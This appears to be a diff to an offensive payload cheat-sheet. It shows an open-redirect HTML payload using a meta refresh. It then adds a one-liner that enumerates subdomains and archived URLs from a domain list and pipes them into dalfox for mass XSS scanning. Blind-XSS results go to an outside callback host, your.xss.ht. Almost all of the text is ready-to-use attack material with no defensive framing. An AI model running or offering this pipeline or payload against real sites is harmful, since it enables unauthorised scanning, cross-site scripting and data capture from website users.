@@ -17,3 +17,6 @@
                  ***Open Redirection Payload***
 
 6) <!DOCTYPE html> <html> <meta http-equiv="refresh" content="0.9; url=http://www.google.com/">&lt;SUBSCRIBE TO OUR CHANNEL&gt; </html>
+
+cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | dalfox pipe -b your.xss.ht -o xss.txt
+
